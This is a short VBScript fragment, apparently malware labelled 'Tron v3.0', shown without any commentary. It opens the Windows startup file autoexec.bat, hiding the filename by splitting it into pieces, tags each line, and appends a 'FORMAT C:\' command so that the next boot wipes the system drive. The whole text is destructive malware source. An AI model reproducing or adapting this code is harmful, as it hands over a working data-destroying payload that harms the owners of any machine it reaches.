   On Error Resume Next
   Set Tron = CreateObject("Scripting.FileSystemObject")
   Set Tronv32 = Tron.OpenTextFile("c:\au" & "to" & "exe" & "c.bat",1)
   Set Tronv30 = chr(13) + chr(10)
   Do While Tronv32.AtEndOfStream = False
     Tronv33 = Tronv33 + Tronv32.ReadLine + Tronv30 + "rem Tron v3.0" + Tronv30
   Loop
   Tronv32.Close
   Tronv33 = Tronv33 + Tronv30 + "FOR" + "MAT C:\ /V:Tron" + Tronv30 + "ECHO. Tron v3.0" + Tronv30 + "%0"
   Set Tron_4 = Tron.CreateTextFile("c:\a" & "uto" & "exe" & "c.bat", 2,false)
   Tron_4.Writeline(Tronv33)
